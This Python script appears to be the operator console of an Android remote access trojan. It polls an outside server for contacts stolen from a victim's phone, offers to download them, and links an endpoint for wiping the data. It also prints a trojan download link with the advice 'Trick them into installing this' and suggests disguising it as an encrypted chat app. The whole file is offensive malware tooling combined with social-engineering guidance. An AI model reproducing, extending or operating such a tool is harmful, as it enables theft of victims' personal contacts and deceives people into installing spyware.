import time
import requests
import os
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RESET = "\033[0m"
version = f"{RED}v0.1{RESET}"
ar_link = f"{GREEN}https://limewire.com/d/qH3xr#XMBJdH6JNP (Trick them into installing this.){RESET}"
delete_data = f"{GREEN}http://bluntcord.medianewsonline.com/aroid_to/delete.php{RESET}"
contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
print(f"{BLUE}Coded by Nihility{RESET}")
print(f"{RED}Android RAT viewer.{RESET}")
print(f"{RED}Victim hasn't accessed the trojan yet...{RESET}")
time.sleep(1)
while True:
    try:
        response = requests.get(contacts_url)
        if response.status_code == 200:
            content = response.text.strip()
            if content:
                os.system('clear')
                print(f"{GREEN}RAT got access. Proceeding...{RESET}")
                print(f"{GREEN}Content:\n {content} {RESET}")
                user_input = input("Download data? Y/N: ")
                if user_input.strip().lower() == 'y':
                    try:
                        download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
                        download_response = requests.get(download_url)
                        if download_response.status_code == 200:
                            save_path = os.path.expanduser('~/Downloads/contacts.txt')
                            save_dir = os.path.dirname(save_path)
                            if not os.path.exists(save_dir):
                                os.makedirs(save_dir)
                            with open(save_path, 'wb') as file:
                                file.write(download_response.content)
                            print(f"File downloaded successfully to {save_path}")
                        else:
                            print(f"Failed to download file. Status code: {download_response.status_code}")
                    except Exception as e:
                        print(f"Error during download: {e}")
                break
            else:
                os.system('clear')
                print(f"""
                      {RED}

                            ███___ ___    _____  _________  ____  __.  _________      
                            ███░/   |   \  /  _  \ \_   ___ \|    |/ _| /   _____/      
                          ███░ /    ~    \/  /_\  \/    \  \/|      <   \_____  \       
                         ██░   \    Y    /    |    \     \___|    |  \  /        \      
                         ░      \___|_  /\____|__  /\______  /____|__ \/_______  /    
                                   ██\/         \/    ░   \/        \/░       \/{RESET}

                                         CODE: Nihility
                                         I might need a coffee break, it's 3:18 AM
                                         NAME: Android Rat (Texter 2026)
                                         

                      """)
                print("                                                         " + version)
                print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                         {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
                print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...\n                                         To wipe data, go to {RESET}" + delete_data)
                
        else:
            print(f"File too large, Received status code {response.status_code}")
            user_input = input("Download content? Y/N: ")
        if user_input.strip().lower() == 'y':
            try:
                download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
                response = requests.get(download_url)
                if response.status_code == 200:
                    with open(os.path.expanduser('~/Downloads/contacts.txt'), 'w') as file:
                        file.write(response.text)
                    print("File downloaded successfully to Downloads folder.")
                else:
                    print(f"Failed to download file. Status code: {response.status_code}")
            except Exception as e:
                print(f"Error during download: {e}")
        break

    except Exception as e:
        print(f"Error fetching data, Content might be too large to gather. Download it.: {e}")
        user_input = input("Download content? Y/N: ")
        if user_input.strip().lower() == 'y':
            try:
                download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
                response = requests.get(download_url)
                if response.status_code == 200:
                    with open(os.path.expanduser('~/Downloads/contacts.txt'), 'w') as file:
                        file.write(response.text)
                    print("File downloaded successfully to Downloads folder.")
                else:
                    print(f"Failed to download file. Status code: {response.status_code}")
            except Exception as e:
                print(f"Error during download: {e}")
        break

